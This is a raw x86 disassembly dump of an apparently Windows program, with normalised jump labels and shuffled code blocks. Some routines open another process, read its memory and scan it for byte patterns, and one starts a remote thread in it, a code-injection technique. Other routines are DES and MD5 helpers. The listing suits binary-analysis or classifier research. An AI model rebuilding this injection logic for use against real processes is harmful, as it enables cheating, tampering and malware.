mov [ ebp - 0x68 ] cx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] ax
jb r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] dx
jb r-xdata
mov ecx [ ebp - 0xa4 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] cx
jb r-xdata
mov eax [ ebp - 0xc0 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] ax
jb r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xfc ]
push ecx
call sub_43811c
add esp 0x4
sub_42e100
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x364
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x360 ] eax
push ebx
push esi
push edi
push 0x14
call sub_438178
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esp + 0x10 ] ebx
mov esi ebx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov esi eax
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ esp + 0x10 ] esi
jmp r-xdata
mov ecx [ esp + 0x36c ]
pop edi
pop esi
pop ebx
xor ecx esp
mov al 0x1
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
cmp eax 0xffffffff
jne r-xdata
push esi
call sub_42e550
add esp 0x4
test al al
je r-xdata
lea edx [ esp + 0x14 ]
push edx
push 0x350
lea edx [ esp + 0x20 ]
push edx
push ecx
push eax
mov [ esp + 0x28 ] ebx
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
push 0x350
push ecx
lea eax [ esp + 0x20 ]
push 0x350
push eax
call sub_438acf
add esp 0x10
test eax eax
sete al
test al al
je r-xdata
mov edx [ esi ]
push edx
call [ CloseHandle@IAT ]
cmp [ esp + 0x14 ] 0x350
je r-xdata
mov eax [ esp + 0x18 ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
jmp r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push edx
push ecx
push 0x78
push ecx
push eax
push ecx
push r--data
push esi
call sub_409de0
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
push r--data
push esi
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
add eax esi
xor edi edi
test [ eax + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
mov ebx 0x1
cmp [ esp + 0x20 ] ebx
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov esi [ esp + 0x10 ]
lea edi [ esp + 0x48 ]
push ebx
push eax
call sub_402d50
or eax 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al [ edi + esi ]
cmp al 0xb
jne r-xdata
inc ebx
add edi 0x20
cmp ebx [ esp + 0x20 ]
jbe r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
test al al
js r-xdata
mov cl 0x78
jmp r-xdata
push 0x9
push rw-data
call sub_40e950
mov esi 0x1
add esp 0x8
cmp [ esp + 0x1c ] esi
jb r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov cl 0x2a
cmp al 0xc
je r-xdata
movzx eax cl
push eax
push ecx
push 0x20
push rw-data
call sub_40e950
add esp 0xc
push eax
call sub_40e950
inc esi
add esp 0x8
cmp esi [ esp + 0x1c ]
jbe r-xdata
mov cl al
and cl 0xf
cmp cl 0xd
jne r-xdata
cmp cl 0xe
jne r-xdata
mov cl 0x3f
jmp r-xdata
and al 0xf0
cmp al 0x40
jne r-xdata
mov cl 0x3c
jmp r-xdata
mov cl 0x2e
jmp r-xdata
test cl cl
jne r-xdata
add cl 0x30
jmp r-xdata
mov cl 0x20
jmp r-xdata
sub_42e4d0
push ebp
mov ebp esp
push ebx
push esi
push 0x14
xor bl bl
call sub_438178
add esp 0x4
test eax eax
je r-xdata
xor esi esi
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov esi eax
jmp r-xdata
push esi
call sub_43811c
add esp 0x4
pop esi
mov al bl
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ esi + eax ]
mov edx [ esi ]
push edi
push 0x0
push 0x0
push 0x0
push ecx
push 0x0
push 0x0
push edx
call [ CreateRemoteThread@IAT ]
mov edi eax
test edi edi
je r-xdata
push esi
call sub_42e550
add esp 0x4
test al al
je r-xdata
pop edi
push 0xffffffff
push edi
mov bl 0x1
call [ WaitForSingleObject@IAT ]
push edi
call [ CloseHandle@IAT ]
sub_42e550
push ebp
mov ebp esp
push 0xffffffff
push sub_4526cb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push 0x10
mov [ ebp - 0x30 ] eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov [ ebp - 0x38 ] ebx
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ ebp - 0x38 ] eax
jmp r-xdata
mov [ ebp - 0x34 ] ebx
mov esi ebx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
push 0xb
mov eax r--data
mov ecx edi
call sub_401c90
mov esi edi
mov [ ebp - 0x34 ] esi
jmp r-xdata
push 0x1c
call sub_438178
mov edi eax
add esp 0x4
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x4 ] ebx
cmp edi ebx
je r-xdata
cmp esi ebx
je r-xdata
push 0x10
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov edi [ ebp - 0x38 ]
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_40b0d0
test al al
je r-xdata
mov esi [ ebp - 0x38 ]
cmp esi ebx
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ ebp - 0x3c ] ebx
mov edi ebx
mov edi eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ ebp - 0x3c ] edi
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
cmp ecx ebx
je r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] cx
call sub_43811c
add esp 0x4
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x2c ]
mov eax [ edi ]
mov esi [ eax + 0x14 ]
mov ebx [ eax + 0x18 ]
push edx
push 0x0
push 0x43a
mov [ ebp - 0x28 ] esi
call [ OpenProcess@IAT ]
mov [ ebp - 0x2c ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x38 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
lea ecx [ ebp - 0x2c ]
push ecx
push edi
mov [ ebp - 0x2c ] eax
call sub_40b5a0
add esp 0x8
test al al
je r-xdata
xor al al
cmp ecx ebx
je r-xdata
cmp [ eax + 0x4 ] ebx
je r-xdata
push esi
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
call sub_43811c
add esp 0x4
mov edx [ ebp - 0x28 ]
mov edi [ esi + 0x4 ]
push edx
call sub_40cb00
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x8
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x34 ]
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
xor ecx ecx
mov [ ebp - 0x24 ] 0x2eb046a
mov [ ebp - 0x20 ] 0xa35b066a
mov [ ebp - 0x1c ] ecx
cmp ebx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
push ecx
call [ CloseHandle@IAT ]
xor al al
cmp [ eax + 0x10 ] ebx
je r-xdata
push edi
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
call sub_43811c
add esp 0x4
mov ecx [ ebp - 0x28 ]
mov ebx [ edi + 0x4 ]
push ecx
call sub_40cb40
mov edx [ edi ]
push edx
call sub_43811c
add esp 0x8
xor ebx ebx
push eax
lea edx [ ebp - 0x1c ]
push edx
lea eax [ ebp - 0x24 ]
push eax
push ecx
push esi
mov edi 0x8
call sub_406610
add esp 0x14
test al al
je r-xdata
lea ecx [ ebx + esi ]
cmp [ eax + 0x8 ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] 0xa10a7502
mov [ ebp - 0x28 ] eax
cmp ebx eax
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x2c ]
add edx edi
lea esi [ edi - 0x4 ]
lea ecx [ ebp - 0x1c ]
call sub_406510
mov esi [ ebp - 0x28 ]
test al al
je r-xdata
cmp [ eax + 0xc ] ebx
je r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x28 ]
push edx
lea ecx [ ebp - 0x1c ]
push ecx
push eax
push esi
mov edi 0x4
call sub_406610
add esp 0x14
test al al
je r-xdata
lea eax [ ebx + esi ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x30 ]
add ecx 0xfffffffc
mov [ edx + 0x4 ] ecx
mov al 0x1
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] 0xa10a7401
mov [ ebp - 0x28 ] eax
cmp ebx eax
je r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x30 ]
add edx 0xfffffff5
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x28 ]
push edx
lea ecx [ ebp - 0x1c ]
push ecx
push eax
push esi
call sub_406610
add esp 0x14
test al al
je r-xdata
lea eax [ ebx + esi ]
mov [ ebp - 0x1c ] 0x33575653
mov [ ebp - 0x18 ] 0x3bff
mov [ ebp - 0x16 ] 0x5
mov [ ebp - 0x28 ] 0x0
test ebx ebx
je r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x30 ]
add edx 0xfffffffa
mov [ eax + 0xc ] edx
xor ebx ebx
add ebx esi
jmp r-xdata
xor ebx ebx
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x30 ]
add ecx 0xfffffff5
mov [ edx + 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x28 ]
push edx
lea eax [ ebp - 0x1c ]
push eax
push ebx
push esi
mov edi 0x7
call sub_406610
mov esi [ ebp - 0x34 ]
mov edi [ ebp - 0x3c ]
add esp 0x14
test al al
je r-xdata
sub_42e890
mov eax [ esp + 0x4 ]
movzx ecx [ eax ]
movzx edx [ ecx + r--data ]
movzx ecx [ eax + 0x1 ]
mov [ eax ] dl
movzx edx [ ecx + r--data ]
movzx ecx [ eax + 0x2 ]
mov [ eax + 0x1 ] dl
movzx edx [ ecx + r--data ]
movzx ecx [ eax + 0x3 ]
mov [ eax + 0x2 ] dl
movzx edx [ ecx + r--data ]
movzx ecx [ eax + 0x4 ]
mov [ eax + 0x3 ] dl
movzx edx [ ecx + r--data ]
movzx ecx [ eax + 0x5 ]
mov [ eax + 0x4 ] dl
movzx edx [ ecx + r--data ]
movzx ecx [ eax + 0x6 ]
mov [ eax + 0x5 ] dl
movzx edx [ ecx + r--data ]
movzx ecx [ eax + 0x7 ]
mov [ eax + 0x6 ] dl
movzx edx [ ecx + r--data ]
mov [ eax + 0x7 ] dl
retn
sub_42e910
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov edx r--data
xor esi esi
sub edx edi
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov ebx [ edx + eax ]
cmp ebx [ eax ]
jne r-xdata
inc esi
add edx 0x8
cmp esi 0x10
jl r-xdata
sub ecx 0x4
add eax 0x4
jmp r-xdata
mov ecx 0x8
mov eax edi
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp ecx 0x4
jb r-xdata
sub_42e960
mov eax 0x4
call sub_43a7f0
mov edx [ esp + 0x8 ]
movzx ecx [ edx ]
push ebx
push ebp
push esi
lea esi [ edx + 0x1 ]
movzx edx [ esi ]
shl edx 0x8
or ecx edx
movzx edx [ esi + 0x1 ]
shl edx 0x10
or ecx edx
movzx edx [ esi + 0x2 ]
push edi
movzx edi [ esi + 0x4 ]
shl edi 0x8
shl edx 0x18
or ecx edx
movzx edx [ esi + 0x3 ]
or edx edi
movzx edi [ esi + 0x6 ]
movzx esi [ esi + 0x5 ]
shl edi 0x8
or edi esi
shl edi 0x10
or edx edi
mov esi edx
shr esi 0x4
xor esi ecx
and esi 0xf0f0f0f
xor ecx esi
shl esi 0x4
xor edx esi
mov esi ecx
shl esi 0x12
xor esi ecx
and esi 0xcccc0000
mov edi esi
shr edi 0x12
xor edi esi
xor ecx edi
mov esi edx
shl esi 0x12
xor esi edx
and esi 0xcccc0000
mov edi esi
shr edi 0x12
xor edi esi
xor edx edi
mov esi edx
shr esi 0x1
xor esi ecx
and esi 0x55555555
xor ecx esi
add esi esi
xor edx esi
mov esi ecx
shr esi 0x8
xor esi edx
and esi 0xff00ff
xor edx esi
shl esi 0x8
mov eax [ esp + 0x1c ]
xor ecx esi
mov esi edx
shr esi 0x1
xor esi ecx
and esi 0x55555555
xor ecx esi
add esi esi
xor edx esi
mov edi edx
shr edi 0xc
mov esi ecx
and esi 0xf000000f
and edi 0xff0
or edi esi
shr edi 0x4
movzx esi dl
shl esi 0x10
and edx 0xff00
or edi esi
or edi edx
mov edx r--data
and ecx 0xfffffff
mov [ esp + 0x10 ] edx
shl esi 0x1b
shr ecx 0x1
shl ebx 0x1b
shr edi 0x1
shl esi 0x1a
shr ecx 0x2
shl ebx 0x1a
shr edi 0x2
jmp r-xdata
shl esi 0x1b
or esi [ esp + 0x1c ]
shl ebx 0x1b
or ebx [ esp + 0x18 ]
mov edi esi
mov ebp ebx
mov edi esi
mov ebp ebx
shl edi 0x1a
shr esi 0x2
shl ebp 0x1a
shr ebx 0x2
or edi esi
or ebp ebx
jmp r-xdata
or ebx edi
or esi ecx
and esi 0xfffffff
mov edx esi
shr edx 0x1
mov ecx edx
and ecx 0x7000000
mov edi esi
and edi 0xc00000
or ecx edi
shr ecx 0x1
mov edi esi
and edi 0x100000
or ecx edi
mov edi edx
and edi 0x60000
shr ecx 0x14
mov ecx [ ecx * 4 + r--data ]
mov [ esp + 0x1c ] edx
and edx 0xf00
mov ebp esi
and ebp 0x1e000
or edi ebp
shr edi 0xd
or ecx [ edi * 4 + r--data ]
mov edi esi
and edi 0xc0
or edx edi
shr edx 0x6
or ecx [ edx * 4 + r--data ]
and ebx 0xfffffff
mov edx esi
and edx 0x3f
or ecx [ edx * 4 + r--data ]
mov edx ebx
shr edx 0x1
mov edi edx
and edi 0x6000000
mov [ esp + 0x18 ] edx
mov ebp ebx
and ebp 0x1e00000
or edi ebp
mov ebp edx
shr edi 0x15
and ebp 0x1e00
mov edx ebx
and edx 0x180
or ebp edx
mov edx [ edi * 4 + r--data ]
shr ebp 0x7
or edx [ ebp * 4 + r--data ]
mov edi ebx
shr edi 0xf
and edi 0x3f
or edx [ edi * 4 + r--data ]
mov edi ebx
and edi 0x3f
or edx [ edi * 4 + r--data ]
movzx edi cx
mov ebp edx
shl ebp 0x10
shr ecx 0x10
and edx 0xffff0000
or edi ebp
or ecx edx
ror edi 0x1e
ror ecx 0x1a
mov [ eax ] edi
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x10 ]
cmp [ ecx ] 0x0
je r-xdata
shl edi 0x1b
or edi [ esp + 0x1c ]
shl ebp 0x1b
or ebp [ esp + 0x18 ]
mov esi edi
mov ebx ebp
mov esi edi
mov ebx ebp
shl esi 0x1a
shr edi 0x2
shl ebx 0x1a
shr ebp 0x2
or esi edi
or ebx ebp
jmp r-xdata
and edi 0xfffffff
mov edx edi
shr edx 0x1
mov ecx edx
and ecx 0x7000000
mov esi edi
and esi 0xc00000
or ecx esi
shr ecx 0x1
mov esi edi
and esi 0x100000
or ecx esi
mov esi edx
and esi 0x60000
shr ecx 0x14
mov ecx [ ecx * 4 + r--data ]
mov [ esp + 0x1c ] edx
and edx 0xf00
mov ebx edi
and ebx 0x1e000
or esi ebx
shr esi 0xd
or ecx [ esi * 4 + r--data ]
mov esi edi
and esi 0xc0
or edx esi
shr edx 0x6
or ecx [ edx * 4 + r--data ]
and ebp 0xfffffff
mov edx edi
and edx 0x3f
or ecx [ edx * 4 + r--data ]
mov edx ebp
shr edx 0x1
mov esi edx
and esi 0x6000000
mov [ esp + 0x18 ] edx
mov ebx ebp
and ebx 0x1e00000
or esi ebx
mov ebx edx
shr esi 0x15
and ebx 0x1e00
mov edx ebp
and edx 0x180
or ebx edx
mov edx [ esi * 4 + r--data ]
shr ebx 0x7
or edx [ ebx * 4 + r--data ]
mov esi ebp
shr esi 0xf
and esi 0x3f
or edx [ esi * 4 + r--data ]
mov esi ebp
and esi 0x3f
or edx [ esi * 4 + r--data ]
movzx esi cx
mov ebx edx
shl ebx 0x10
shr ecx 0x10
and edx 0xffff0000
or esi ebx
or ecx edx
ror esi 0x1e
ror ecx 0x1a
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x10 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
shl esi 0x1b
or esi [ esp + 0x1c ]
shl ebx 0x1b
or ebx [ esp + 0x18 ]
mov ecx esi
mov edi ebx
mov ecx esi
mov edi ebx
shl ecx 0x1a
shr esi 0x2
shl edi 0x1a
shr ebx 0x2
or ecx esi
or edi ebx
jmp r-xdata
and esi 0xfffffff
mov edx esi
shr edx 0x1
mov ecx edx
and ecx 0x7000000
mov edi esi
and edi 0xc00000
or ecx edi
shr ecx 0x1
mov edi esi
and edi 0x100000
or ecx edi
mov edi edx
and edi 0x60000
shr ecx 0x14
mov ecx [ ecx * 4 + r--data ]
mov [ esp + 0x1c ] edx
and edx 0xf00
mov ebp esi
and ebp 0x1e000
or edi ebp
shr edi 0xd
or ecx [ edi * 4 + r--data ]
mov edi esi
and edi 0xc0
or edx edi
shr edx 0x6
or ecx [ edx * 4 + r--data ]
and ebx 0xfffffff
mov edx esi
and edx 0x3f
or ecx [ edx * 4 + r--data ]
mov edx ebx
shr edx 0x1
mov edi edx
and edi 0x6000000
mov [ esp + 0x18 ] edx
mov ebp ebx
and ebp 0x1e00000
or edi ebp
mov ebp edx
shr edi 0x15
and ebp 0x1e00
mov edx ebx
and edx 0x180
or ebp edx
mov edx [ edi * 4 + r--data ]
shr ebp 0x7
or edx [ ebp * 4 + r--data ]
mov edi ebx
shr edi 0xf
and edi 0x3f
or edx [ edi * 4 + r--data ]
mov edi ebx
and edi 0x3f
or edx [ edi * 4 + r--data ]
movzx edi cx
mov ebp edx
shl ebp 0x10
shr ecx 0x10
and edx 0xffff0000
or edi ebp
or ecx edx
ror edi 0x1e
ror ecx 0x1a
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x10 ]
cmp [ ecx + 0x8 ] 0x0
je r-xdata
cmp [ edx - 0x4 ] 0x0
mov esi ecx
mov ebx edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
and ecx 0xfffffff
mov esi ecx
shr esi 0x1
mov edx esi
and edx 0x7000000
mov ebx ecx
and ebx 0xc00000
or edx ebx
shr edx 0x1
mov ebx ecx
and ebx 0x100000
or edx ebx
mov ebx esi
and ebx 0x60000
shr edx 0x14
mov edx [ edx * 4 + r--data ]
and esi 0xf00
mov ebp ecx
and ebp 0x1e000
or ebx ebp
shr ebx 0xd
or edx [ ebx * 4 + r--data ]
mov ebx ecx
and ebx 0xc0
or esi ebx
shr esi 0x6
or edx [ esi * 4 + r--data ]
and edi 0xfffffff
mov esi ecx
and esi 0x3f
or edx [ esi * 4 + r--data ]
mov ebx edi
shr ebx 0x1
mov esi ebx
and esi 0x6000000
and ebx 0x1e00
mov ebp edi
and ebp 0x1e00000
or esi ebp
shr esi 0x15
mov esi [ esi * 4 + r--data ]
mov ebp edi
and ebp 0x180
or ebx ebp
shr ebx 0x7
or esi [ ebx * 4 + r--data ]
mov ebx edi
shr ebx 0xf
and ebx 0x3f
or esi [ ebx * 4 + r--data ]
mov ebx edi
and ebx 0x3f
or esi [ ebx * 4 + r--data ]
movzx ebx dx
mov ebp esi
shl ebp 0x10
shr edx 0x10
and esi 0xffff0000
or ebx ebp
or edx esi
ror ebx 0x1e
ror edx 0x1a
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] edx
mov edx [ esp + 0x10 ]
add edx 0x10
add eax 0x20
mov [ esp + 0x10 ] edx
cmp edx r--data
jl r-xdata
sub_42ef20
push esi
mov esi [ esp + 0x8 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx + esi ]
movzx edx al
cmp al [ edx + r--data ]
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc ecx
cmp ecx 0x8
jb r-xdata
push esi
call sub_42e910
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push eax
push esi
call sub_42e960
add esp 0x8
xor eax eax
pop esi
retn
mov eax 0xfffffffe
pop esi
retn
sub_42efa0
mov edx [ esp + 0x8 ]
push ebp
push edi
mov edi [ esp + 0x14 ]
mov ebp edx
test edi edi
je r-xdata
pop edi
mov eax 0x1
pop ebp
retn
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0x10 ]
lea ecx [ eax + edi * 8 ]
cmp ecx eax
jae r-xdata
mov eax edi
shr eax 0x1d
add [ esi + 0x14 ] eax
mov eax [ esi + 0x58 ]
push ebx
mov [ esi + 0x10 ] ecx
test eax eax
je r-xdata
inc [ esi + 0x14 ]
mov ebx edi
shr ebx 0x6
test ebx ebx
je r-xdata
lea ebp [ esi + 0x18 ]
cmp edi 0x40
jae r-xdata
test edi edi
je r-xdata
push ebx
push ebp
push esi
call sub_42f5c0
shl ebx 0x6
add esp 0xc
add ebp ebx
sub edi ebx
mov ebx 0x40
sub ebx eax
push ebx
push edx
lea edx [ eax + ebp ]
push edx
call sub_43a8a0
push 0x1
push ebp
push esi
call sub_42f5c0
mov eax [ esp + 0x30 ]
push 0x40
lea ecx [ ebx + eax ]
push 0x0
push ebp
mov [ esp + 0x3c ] ecx
sub edi ebx
mov [ esi + 0x58 ] 0x0
call sub_43a820
mov ebp [ esp + 0x3c ]
add esp 0x24
lea ecx [ eax + edi ]
cmp ecx 0x40
jae r-xdata
pop ebx
pop esi
push edi
mov [ esi + 0x58 ] edi
push ebp
add esi 0x18
push esi
call sub_43a8a0
add esp 0xc
push edi
push edx
add ebp eax
push ebp
call sub_43a8a0
add esp 0xc
add [ esi + 0x58 ] edi
pop ebx
pop esi
pop edi
mov eax 0x1
pop ebp
retn
sub_42f080
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov ebx [ edi + 0x58 ]
lea esi [ edi + 0x18 ]
mov [ ebx + esi ] 0x80
inc ebx
cmp ebx 0x38
jbe r-xdata
mov ecx 0x38
sub ecx ebx
push ecx
push 0x0
add ebx esi
push ebx
call sub_43a820
movzx edx [ edi + 0x10 ]
mov [ esi + 0x38 ] dl
movzx eax [ edi + 0x11 ]
mov [ esi + 0x39 ] al
movzx ecx [ edi + 0x12 ]
mov [ esi + 0x3a ] cl
movzx edx [ edi + 0x13 ]
mov [ esi + 0x3b ] dl
movzx eax [ edi + 0x14 ]
mov [ esi + 0x3c ] al
movzx ecx [ edi + 0x15 ]
mov [ esi + 0x3d ] cl
movzx edx [ edi + 0x16 ]
mov [ esi + 0x3e ] dl
movzx eax [ edi + 0x17 ]
push 0x1
push esi
push edi
mov [ esi + 0x3f ] al
call sub_42f5c0
push 0x40
push 0x0
push esi
mov [ edi + 0x58 ] 0x0
call sub_43a820
mov ecx [ edi ]
mov eax [ esp + 0x34 ]
mov [ eax ] cl
mov edx ecx
shr edx 0x8
mov [ eax + 0x1 ] dl
mov edx ecx
shr edx 0x10
mov [ eax + 0x2 ] dl
shr ecx 0x18
mov [ eax + 0x3 ] cl
mov ecx [ edi + 0x4 ]
mov [ eax + 0x4 ] cl
mov edx ecx
shr edx 0x8
mov [ eax + 0x5 ] dl
mov edx ecx
shr edx 0x10
mov [ eax + 0x6 ] dl
shr ecx 0x18
mov [ eax + 0x7 ] cl
mov ecx [ edi + 0x8 ]
mov [ eax + 0x8 ] cl
mov edx ecx
shr edx 0x8
mov [ eax + 0x9 ] dl
mov edx ecx
shr edx 0x10
mov [ eax + 0xa ] dl
shr ecx 0x18
mov [ eax + 0xb ] cl
mov ecx [ edi + 0xc ]
mov [ eax + 0xc ] cl
mov edx ecx
shr edx 0x8
mov [ eax + 0xd ] dl
add esp 0x24
mov edx ecx
pop edi
shr edx 0x10
mov [ eax + 0xe ] dl
shr ecx 0x18
pop esi
mov [ eax + 0xf ] cl
mov eax 0x1
pop ebx
retn
mov eax 0x40
sub eax ebx
push eax
push 0x0
add ebx esi
push ebx
call sub_43a820
push 0x1
push esi
push edi
xor ebx ebx
call sub_42f5c0
add esp 0x18
sub_42f1a0
push esi
mov esi [ esp + 0x8 ]
push 0x5c
push 0x0
push esi
call sub_43a820
add esp 0xc
mov [ esi ] 0x67452301
mov [ esi + 0x4 ] 0xefcdab89
mov [ esi + 0x8 ] 0x98badcfe
mov [ esi + 0xc ] 0x10325476
mov eax 0x1
pop esi
retn
